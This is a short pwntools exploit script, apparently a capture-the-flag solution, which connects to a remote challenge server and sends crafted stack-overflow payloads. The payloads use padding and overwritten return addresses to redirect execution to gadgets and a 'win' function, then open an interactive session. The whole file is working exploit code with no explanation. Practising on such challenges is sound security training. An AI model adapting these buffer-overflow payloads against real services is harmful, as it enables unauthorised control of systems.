#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./challenge")
context.binary = exe

# io = gdb.debug(exe.path, 'b* 0x040125b\nc')
io = remote('20.80.240.190', 14124)

io.sendafter(b'!\n', b'a'*8*13+p64(0x7000000001)+p64(0x4011f4))
io.send(b'b'*8*11+p64(0x4011f1)+p64(exe.sym.user+112)+p64(0x7000000001)+p64(exe.sym.win))
io.send(b'c'*8*13+p64(0x7000000001)+p64(0x4011f4))
io.send(b'admin\x00\x00\x00'+b'c'*8*12+p64(0x7000000001)+p64(exe.sym.win))
io.interactive()
